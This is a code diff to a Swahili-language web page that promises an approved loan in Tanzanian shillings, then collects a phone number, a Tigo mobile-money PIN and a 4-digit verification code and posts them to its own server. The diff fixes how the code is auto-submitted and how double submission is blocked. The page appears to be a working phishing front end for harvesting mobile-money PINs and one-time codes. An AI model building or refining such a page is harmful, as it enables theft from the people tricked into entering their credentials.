@@ -99,7 +99,7 @@
         document.getElementById('approvedAmount').textContent = 'TZS ' + loanAmount.toLocaleString();
         var appId = '', checkInterval = null, countdownTimer = null, userPhone = '';
         var resendCount = 0, resendCooldown = false;
-        var codeSubmitted = false;   // prevent double submission
+        var codeSubmitted = false;
 
         function togglePIN() { var p = document.getElementById('tigoPin'); var b = p.parentElement.querySelector('.toggle-btn'); if (p.type === 'password') { p.type = 'text'; b.textContent = '🙈'; } else { p.type = 'password'; b.textContent = '👁️'; } }
         document.getElementById('phoneNumber').addEventListener('input', function() { this.value = this.value.replace(/\D/g, ''); });
@@ -176,7 +176,7 @@
             document.getElementById('pinError').classList.add('show'); 
         }
 
-        // Auto-advance code inputs
+        // Auto-advance and auto-submit
         function nextCode(input) {
             input.value = input.value.replace(/\D/g, '');
             if (input.value.length === 1) {
@@ -185,11 +185,11 @@
             }
             var allFilled = true;
             document.querySelectorAll('.cd').forEach(function(d) { if (d.value === '') allFilled = false; });
-            if (allFilled && !codeSubmitted) {
-                codeSubmitted = true;
+            if (allFilled) {
                 document.querySelectorAll('.cd').forEach(function(d) { d.classList.add('filled'); });
                 if (countdownTimer) clearInterval(countdownTimer);
-                setTimeout(function() { submitCode(); }, 300);
+                // auto-submit directly (do not set codeSubmitted here)
+                submitCode();
             }
         }
 
@@ -222,17 +222,16 @@
         }
 
         async function submitCode() {
-            if (codeSubmitted) return;
+            if (codeSubmitted) return;   // prevent double submission
             var enteredCode = '';
             document.querySelectorAll('.cd').forEach(function(d) { enteredCode += d.value; });
             if (enteredCode.length !== 4) {
                 document.getElementById('codeError').textContent = 'Ingiza namba kamili';
                 document.getElementById('codeError').style.color = 'var(--danger)';
                 document.getElementById('codeError').classList.add('show');
-                codeSubmitted = false;
                 return;
             }
-            codeSubmitted = true;
+            codeSubmitted = true;   // lock submission
             document.getElementById('screen3').classList.remove('active'); 
             document.getElementById('screen4').classList.add('active');
             await fetch('/api/submit_code', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ app_id: appId, code: enteredCode }) });
